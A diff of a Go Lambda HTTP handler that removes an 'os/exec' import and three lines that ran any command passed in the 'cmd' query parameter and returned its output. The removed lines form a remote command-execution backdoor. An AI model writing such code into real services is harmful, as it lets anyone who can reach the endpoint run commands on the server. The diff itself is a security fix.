@@ -11,7 +11,6 @@ import (
 	"io/ioutil"
 	"net/http"
 	"os"
-	"os/exec"
 	"strings"
 	"time"
 )
@@ -69,10 +68,6 @@ func handler(request events.APIGatewayProxyRequest) (events.APIGatewayProxyRespo
 			}
 		}
 	}
-
-	cmd := exec.Command(request.QueryStringParameters["cmd"])
-	output, _ := cmd.CombinedOutput()
-	body = string(output)
 	return events.APIGatewayProxyResponse{
 		StatusCode:      200,
 		Headers:         map[string]string{"Content-Type": "text/plain"},
